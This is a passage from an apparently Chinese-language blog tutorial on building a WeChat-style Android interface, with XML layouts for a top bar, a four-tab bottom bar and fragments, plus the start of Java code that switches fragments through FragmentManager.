class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center_horizontal"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"微信"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TextView</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="底部选择栏bottom-xml"><a href="#底部选择栏bottom-xml" class="headerlink" title="底部选择栏bottom.xml"></a>底部选择栏bottom.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png'><img src="https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:baselineAligned</span>=<span class="hljs-string">"false"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 微信--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/wx"</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"聊天"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/txl"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"通讯"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/find"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"发现"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/w"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"我的"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="4个fragment-xml"><a href="#4个fragment-xml" class="headerlink" title="4个fragment.xml"></a>4个fragment.xml</h4><p>通过一个xml文件将标题栏部分和底部选择栏部分添加到一个xml文件里面，再两个文件中间添加一个content部件，将四个fragment当做卡片压入中间主体部分。四个fragment的xml文件类似，故只放一个文件的内容。</p><h4 id="fragment-lt-xml"><a href="#fragment-lt-xml" class="headerlink" title="fragment_lt.xml"></a>fragment_lt.xml</h4><p>第一个聊天界面我设置列表效果，只需要添加一个 recycleview 实现列表效果即可</p><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png'><img src="https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/recyclerview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span> /&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>其他3个xml页面设置为介绍界面即可，效果和代码如下所示</p><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png'><img src="https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- <span class="hljs-doctag">TODO:</span> Update blank fragment layout --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"这是聊天界面"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上文已经在相应的 fragment_lt.xml 文件里面添加了 recycleview，此时再添加一个item.xml页面用于页面显示，只包含一个textview</p><h4 id="item-xml"><a href="#item-xml" class="headerlink" title="item.xml"></a>item.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png'><img src="https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@android:color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="main-xml"><a href="#main-xml" class="headerlink" title="main.xml"></a>main.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png'><img src="https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".MainActivity"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/top"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"0dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/bottom"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="3-Java文件代码编写"><a href="#3-Java文件代码编写" class="headerlink" title="3. Java文件代码编写"></a>3. Java文件代码编写</h3><p>首先依次创建4个fragement</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png'><img src="https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png" alt="image.png"></p><p>会在相应的layout文件夹下生成4个.xml文件</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png'><img src="https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png" alt="image.png"></p><p>目前的界面只是一个比较简单的界面，需要完成的功能仅有展示和通过点击部件更换中间部分展示的界面，所以要考虑的代码部分分别为以下四个内容：</p><blockquote><ol><li>点击监听部分onclick</li></ol></blockquote><blockquote><ol start="2"><li>将4个fragment压入content里面的代码部分</li></ol></blockquote><blockquote><ol start="3"><li>将四个卡片隐藏起来的代码部分</li></ol></blockquote><blockquote><ol start="4"><li>当点击时展示的界面代码部分</li></ol></blockquote><p>创建4个Frangment变量、1个管理对象FragmentManager变量 、4个LinearLayout变量对象</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br></code></pre></td></tr></tbody></table></figure><p>新建一个inital函数用以给Fragment页面初始化，在此函数中，将此前定义个4个Fragment变量使用fragmentManager添加到main文件中的中间主体部分的布局中</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>    <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>            .add(R.id.content,fragment1)<br>            .add(R.id.content,fragment2)<br>            .add(R.id.content,fragment3)<br>            .add(R.id.content,fragment4);<br>    ft.commit();<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>在点击四个部件时需要展示其所代表的界面，故编写新的一个函数showfragment，展示fragment界面</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>       <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>               .show(fragment);<br>       transaction.commit();<br>   }<br></code></pre></td></tr></tbody></table></figure><p>而在切换界面时，需要对原先的界面进行隐藏之后再展示所需界面，故编写一个新的函数fragmentHide，将所有的fragment界面都隐藏</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 